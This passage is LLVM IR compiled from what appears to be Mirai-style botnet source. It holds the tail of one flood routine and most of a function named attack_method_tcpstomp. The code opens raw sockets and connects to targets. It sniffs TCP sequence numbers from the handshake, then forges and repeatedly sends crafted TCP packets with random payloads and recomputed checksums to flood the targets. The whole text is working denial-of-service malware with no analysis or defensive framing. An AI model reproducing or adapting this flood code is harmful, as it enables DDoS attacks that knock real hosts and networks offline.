  %148 = call zeroext i16 @htons(i16 zeroext %18) #11
  %149 = bitcast i8* %128 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %20) #11
  %151 = getelementptr inbounds i8, i8* %125, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %51) #11
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %125, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %125, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %.135, i16* %158, align 4
  call void @rand_str(i8* nonnull %129, i32 %35)
  %159 = load i32, i32* %5, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %5, align 4
  %161 = icmp slt i32 %160, %46
  br i1 %161, label %.lr.ph129.split, label %.preheader.loopexit139

.loopexit.loopexit:                               ; preds = %201
  br label %.loopexit.backedge

.loopexit.loopexit138:                            ; preds = %259
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit138
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %109, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %201
  %storemerge121128.us = phi i32 [ %220, %201 ], [ 0, %.lr.ph.split.us.preheader ]
  %162 = sext i32 %storemerge121128.us to i64
  %163 = getelementptr inbounds i8*, i8** %8, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  %166 = getelementptr inbounds i8, i8* %164, i64 20
  %167 = getelementptr inbounds i8, i8* %164, i64 40
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = icmp ult i8 %169, 32
  br i1 %170, label %171, label %178

; <label>:171:                                    ; preds = %.lr.ph.split.us
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @ntohl(i32 %173) #11
  %175 = call i32 @htonl(i32 %174) #11
  %176 = getelementptr inbounds i8, i8* %164, i64 16
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %.lr.ph.split.us, %171
  %179 = getelementptr inbounds i8, i8* %164, i64 12
  %180 = bitcast i8* %179 to i32*
  store i32 0, i32* %180, align 4
  br i1 %111, label %181, label %184

; <label>:181:                                    ; preds = %178
  %182 = getelementptr inbounds i8, i8* %164, i64 4
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %181, %178
  br i1 %113, label %185, label %187

; <label>:185:                                    ; preds = %184
  %186 = bitcast i8* %166 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %185, %184
  br i1 %115, label %188, label %191

; <label>:188:                                    ; preds = %187
  %189 = getelementptr inbounds i8, i8* %164, i64 22
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %188, %187
  br i1 %116, label %192, label %195

; <label>:192:                                    ; preds = %191
  %193 = getelementptr inbounds i8, i8* %164, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 0, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %192, %191
  br i1 %117, label %196, label %199

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds i8, i8* %164, i64 28
  %198 = bitcast i8* %197 to i32*
  store i32 0, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %195
  br i1 %118, label %201, label %200

; <label>:200:                                    ; preds = %199
  call void @rand_str(i8* nonnull %167, i32 %35)
  %.pre132 = load i32, i32* %5, align 4
  br label %201

; <label>:201:                                    ; preds = %200, %199
  %202 = phi i32 [ %.pre132, %200 ], [ %storemerge121128.us, %199 ]
  %203 = getelementptr inbounds i8, i8* %164, i64 10
  %204 = bitcast i8* %203 to i16*
  store i16 0, i16* %204, align 2
  %205 = bitcast i8* %164 to i16*
  %206 = call zeroext i16 @checksum_generic(i16* %205, i32 20)
  store i16 %206, i16* %204, align 2
  %207 = getelementptr inbounds i8, i8* %164, i64 36
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext %121) #11
  %210 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %165, i8* nonnull %166, i16 zeroext %209, i32 %122)
  store i16 %210, i16* %208, align 4
  %211 = getelementptr inbounds i8, i8* %164, i64 22
  %212 = bitcast i8* %211 to i16*
  %213 = load i16, i16* %212, align 2
  %214 = sext i32 %202 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0, i32 1
  store i16 %213, i16* %215, align 2
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0
  %217 = bitcast %struct.sockaddr_in* %216 to %struct.sockaddr*
  %218 = call i64 @sendto(i32 %40, i8* nonnull %164, i64 %123, i32 16384, %struct.sockaddr* %217, i32 16) #10
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = icmp slt i32 %220, %46
  br i1 %221, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %259
  %storemerge121128 = phi i32 [ %278, %259 ], [ 0, %.lr.ph.split.preheader ]
  %222 = sext i32 %storemerge121128 to i64
  %223 = getelementptr inbounds i8*, i8** %8, i64 %222
  %224 = load i8*, i8** %223, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  %226 = getelementptr inbounds i8, i8* %224, i64 20
  %227 = getelementptr inbounds i8, i8* %224, i64 40
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 2
  %229 = load i8, i8* %228, align 4
  %230 = icmp ult i8 %229, 32
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %.lr.ph.split
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = call i32 @ntohl(i32 %233) #11
  %235 = call i32 @htonl(i32 %234) #11
  %236 = getelementptr inbounds i8, i8* %224, i64 16
  %237 = bitcast i8* %236 to i32*
  store i32 %235, i32* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %.lr.ph.split, %231
  br i1 %111, label %239, label %242

; <label>:239:                                    ; preds = %238
  %240 = getelementptr inbounds i8, i8* %224, i64 4
  %241 = bitcast i8* %240 to i16*
  store i16 0, i16* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %239, %238
  br i1 %113, label %243, label %245

; <label>:243:                                    ; preds = %242
  %244 = bitcast i8* %226 to i16*
  store i16 0, i16* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %243, %242
  br i1 %115, label %246, label %249

; <label>:246:                                    ; preds = %245
  %247 = getelementptr inbounds i8, i8* %224, i64 22
  %248 = bitcast i8* %247 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %246, %245
  br i1 %116, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %224, i64 24
  %252 = bitcast i8* %251 to i32*
  store i32 0, i32* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %117, label %254, label %257

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds i8, i8* %224, i64 28
  %256 = bitcast i8* %255 to i32*
  store i32 0, i32* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %254, %253
  br i1 %118, label %259, label %258

; <label>:258:                                    ; preds = %257
  call void @rand_str(i8* %227, i32 %35)
  %.pre = load i32, i32* %5, align 4
  br label %259

; <label>:259:                                    ; preds = %257, %258
  %260 = phi i32 [ %storemerge121128, %257 ], [ %.pre, %258 ]
  %261 = getelementptr inbounds i8, i8* %224, i64 10
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = bitcast i8* %224 to i16*
  %264 = call zeroext i16 @checksum_generic(i16* %263, i32 20)
  store i16 %264, i16* %262, align 2
  %265 = getelementptr inbounds i8, i8* %224, i64 36
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 4
  %267 = call zeroext i16 @htons(i16 zeroext %121) #11
  %268 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %225, i8* %226, i16 zeroext %267, i32 %122)
  store i16 %268, i16* %266, align 4
  %269 = getelementptr inbounds i8, i8* %224, i64 22
  %270 = bitcast i8* %269 to i16*
  %271 = load i16, i16* %270, align 2
  %272 = sext i32 %260 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %271, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %224, i64 %123, i32 16384, %struct.sockaddr* %275, i32 16) #10
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit138

; <label>:280:                                    ; preds = %4, %107
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre175 = sext i32 %37 to i64
  %.pre176 = add nsw i64 %.pre175, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161

.lr.ph161:                                        ; preds = %.preheader151
  br i1 %51, label %.lr.ph161.split.us.preheader, label %.lr.ph161.split.preheader

.lr.ph161.split.preheader:                        ; preds = %.lr.ph161
  br label %.lr.ph161.split

.lr.ph161.split.us.preheader:                     ; preds = %.lr.ph161
  br label %.lr.ph161.split.us

.lr.ph161.split.us:                               ; preds = %.lr.ph161.split.us.preheader, %.backedge.us
  %86 = phi i32 [ %133, %.backedge.us ], [ %84, %.lr.ph161.split.us.preheader ]
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0) #10
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %88) #10
  store i16 2, i16* %48, align 4
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %93 = load i8, i8* %92, align 4
  %94 = icmp ult i8 %93, 32
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %96 = load i32, i32* %95, align 4
  br i1 %94, label %97, label %100

; <label>:97:                                     ; preds = %.lr.ph161.split.us
  %98 = call i32 @ntohl(i32 %96) #11
  %99 = call i32 @htonl(i32 %98) #11
  br label %100

; <label>:100:                                    ; preds = %97, %.lr.ph161.split.us
  %.sink.us = phi i32 [ %99, %97 ], [ %96, %.lr.ph161.split.us ]
  store i32 %.sink.us, i32* %49, align 4
  store i16 0, i16* %52, align 2
  %101 = call i32 @connect(i32 %86, %struct.sockaddr* nonnull %53, i32 16) #10
  %102 = call i64 @time(i64* null) #10
  br label %103

; <label>:103:                                    ; preds = %127, %100
  store i32 16, i32* %8, align 4
  %104 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %105 = trunc i64 %104 to i32
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %.loopexit150.loopexit, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* %56, align 4
  %109 = load i32, i32* %49, align 4
  %110 = icmp eq i32 %108, %109
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %107
  %sext.us = shl i64 %104, 32
  %112 = ashr exact i64 %sext.us, 32
  %113 = icmp ugt i64 %112, 40
  br i1 %113, label %114, label %127

; <label>:114:                                    ; preds = %111
  %115 = load i16, i16* %58, align 4
  %116 = load i16, i16* %52, align 2
  %117 = icmp eq i16 %115, %116
  br i1 %117, label %118, label %127

; <label>:118:                                    ; preds = %114
  %119 = load i16, i16* %60, align 16
  %120 = and i16 %119, 4608
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %.us-lcssa.us.loopexit, label %122

; <label>:122:                                    ; preds = %118
  %123 = and i16 %119, 1280
  %124 = icmp eq i16 %123, 0
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %122
  %126 = call i32 @close(i32 %86) #10
  br label %.backedge.us

; <label>:127:                                    ; preds = %122, %114, %111, %107
  %128 = call i64 @time(i64* null) #10
  %129 = sub nsw i64 %128, %102
  %130 = icmp sgt i64 %129, 10
  br i1 %130, label %131, label %103

; <label>:131:                                    ; preds = %127
  %132 = call i32 @close(i32 %86) #10
  br label %.backedge.us

.backedge.us:                                     ; preds = %131, %125
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %.loopexit152.loopexit, label %.lr.ph161.split.us

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi177 = phi i64 [ %.pre176, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre175, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %135 = and i32 %17, 65535
  %136 = icmp eq i32 %135, 65535
  %137 = icmp eq i8 %39, 0
  %138 = add nsw i64 %.pre-phi, 20
  %139 = trunc i64 %138 to i16
  %140 = trunc i64 %138 to i32
  br label %.loopexit

.lr.ph161.split:                                  ; preds = %.lr.ph161.split.preheader, %.backedge
  %141 = phi i32 [ %235, %.backedge ], [ %84, %.lr.ph161.split.preheader ]
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 3, i32 0) #10
  %143 = or i32 %142, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %143) #10
  store i16 2, i16* %48, align 4
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %148 = load i8, i8* %147, align 4
  %149 = icmp ult i8 %148, 32
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %151 = load i32, i32* %150, align 4
  br i1 %149, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph161.split
  %153 = call i32 @ntohl(i32 %151) #11
  %154 = call i32 @htonl(i32 %153) #11
  br label %155

; <label>:155:                                    ; preds = %.lr.ph161.split, %152
  %.sink = phi i32 [ %154, %152 ], [ %151, %.lr.ph161.split ]
  store i32 %.sink, i32* %49, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %24) #11
  store i16 %156, i16* %52, align 2
  %157 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %53, i32 16) #10
  %158 = call i64 @time(i64* null) #10
  br label %159

; <label>:159:                                    ; preds = %237, %155
  store i32 16, i32* %8, align 4
  %160 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %161 = trunc i64 %160 to i32
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %.loopexit150.loopexit205, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %56, align 4
  %165 = load i32, i32* %49, align 4
  %166 = icmp eq i32 %164, %165
  br i1 %166, label %167, label %237

; <label>:167:                                    ; preds = %163
  %sext = shl i64 %160, 32
  %168 = ashr exact i64 %sext, 32
  %169 = icmp ugt i64 %168, 40
  br i1 %169, label %170, label %237

; <label>:170:                                    ; preds = %167
  %171 = load i16, i16* %58, align 4
  %172 = load i16, i16* %52, align 2
  %173 = icmp eq i16 %171, %172
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %170
  %175 = load i16, i16* %60, align 16
  %176 = and i16 %175, 4608
  %177 = icmp eq i16 %176, 4608
  br i1 %177, label %.us-lcssa.us.loopexit206, label %230

.us-lcssa.us.loopexit:                            ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us.loopexit206:                         ; preds = %174
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit206, %.us-lcssa.us.loopexit
  %178 = phi i16 [ %115, %.us-lcssa.us.loopexit ], [ %171, %.us-lcssa.us.loopexit206 ]
  %179 = phi i32 [ %108, %.us-lcssa.us.loopexit ], [ %164, %.us-lcssa.us.loopexit206 ]
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 0
  store i32 %179, i32* %182, align 4
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #11
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 1
  store i32 %185, i32* %186, align 4
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #11
  %190 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 2
  store i32 %189, i32* %190, align 4
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %192 = load i16, i16* %191, align 2
  %193 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 3
  store i16 %192, i16* %193, align 4
  %194 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 4
  store i16 %178, i16* %194, align 2
  %195 = call noalias i8* @malloc(i64 %62) #10
  %196 = getelementptr inbounds i8*, i8** %14, i64 %181
  store i8* %195, i8** %196, align 8
  %197 = getelementptr inbounds i8, i8* %195, i64 20
  %198 = bitcast i8* %197 to %struct.tcphdr*
  %199 = getelementptr inbounds i8, i8* %195, i64 40
  store i8 69, i8* %195, align 4
  %200 = getelementptr inbounds i8, i8* %195, i64 1
  store i8 %16, i8* %200, align 1
  %201 = call zeroext i16 @htons(i16 zeroext %63) #11
  %202 = getelementptr inbounds i8, i8* %195, i64 2
  %203 = bitcast i8* %202 to i16*
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %18) #11
  %205 = getelementptr inbounds i8, i8* %195, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  %207 = getelementptr inbounds i8, i8* %195, i64 8
  store i8 %20, i8* %207, align 4
  br i1 %64, label %212, label %208

; <label>:208:                                    ; preds = %.us-lcssa.us
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %210 = getelementptr inbounds i8, i8* %195, i64 6
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %.us-lcssa.us, %208
  %213 = getelementptr inbounds i8, i8* %195, i64 9
  store i8 6, i8* %213, align 1
  %214 = load i32, i32* @LOCAL_ADDR, align 4
  %215 = getelementptr inbounds i8, i8* %195, i64 12
  %216 = bitcast i8* %215 to i32*
  store i32 %214, i32* %216, align 4
  %217 = getelementptr inbounds i8, i8* %195, i64 16
  %218 = bitcast i8* %217 to i32*
  store i32 %179, i32* %218, align 4
  %219 = bitcast i8* %197 to i16*
  store i16 %192, i16* %219, align 4
  %220 = getelementptr inbounds i8, i8* %195, i64 22
  %221 = bitcast i8* %220 to i16*
  store i16 %178, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %195, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %189, i32* %223, align 4
  %224 = getelementptr inbounds i8, i8* %195, i64 28
  %225 = bitcast i8* %224 to i32*
  store i32 %185, i32* %225, align 4
  %226 = getelementptr inbounds i8, i8* %195, i64 32
  %227 = bitcast i8* %226 to i16*
  %228 = getelementptr inbounds i8, i8* %195, i64 34
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 2
  store i16 %81, i16* %227, align 4
  call void @rand_str(i8* %199, i32 %37)
  br label %.loopexit152

; <label>:230:                                    ; preds = %174
  %231 = and i16 %175, 1280
  %232 = icmp eq i16 %231, 0
  br i1 %232, label %237, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @close(i32 %141) #10
  br label %.backedge

.backedge:                                        ; preds = %233, %241
  %235 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %.loopexit152.loopexit207, label %.lr.ph161.split

; <label>:237:                                    ; preds = %230, %170, %167, %163
  %238 = call i64 @time(i64* null) #10
  %239 = sub nsw i64 %238, %158
  %240 = icmp sgt i64 %239, 10
  br i1 %240, label %241, label %159

; <label>:241:                                    ; preds = %237
  %242 = call i32 @close(i32 %141) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit152

.loopexit152.loopexit207:                         ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit207, %.loopexit152.loopexit, %.preheader151, %212
  %.1 = phi %struct.tcphdr* [ %198, %212 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ], [ %.0162, %.loopexit152.loopexit207 ]
  %243 = load i32, i32* %5, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %5, align 4
  %245 = icmp slt i32 %244, %46
  br i1 %245, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %255
  br label %.loopexit.backedge

.loopexit.loopexit204:                            ; preds = %298
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit204
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %136, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %255
  %storemerge139160.us = phi i32 [ %289, %255 ], [ 0, %.lr.ph.split.us.preheader ]
  %246 = sext i32 %storemerge139160.us to i64
  %247 = getelementptr inbounds i8*, i8** %14, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  %250 = getelementptr inbounds i8, i8* %248, i64 20
  %251 = getelementptr inbounds i8, i8* %248, i64 4
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br i1 %137, label %255, label %253

; <label>:253:                                    ; preds = %.lr.ph.split.us
  %254 = getelementptr inbounds i8, i8* %248, i64 40
  call void @rand_str(i8* %254, i32 %37)
  %.pre174 = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %253, %.lr.ph.split.us
  %256 = phi i32 [ %.pre174, %253 ], [ %storemerge139160.us, %.lr.ph.split.us ]
  %257 = getelementptr inbounds i8, i8* %248, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %248 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = sext i32 %256 to i64
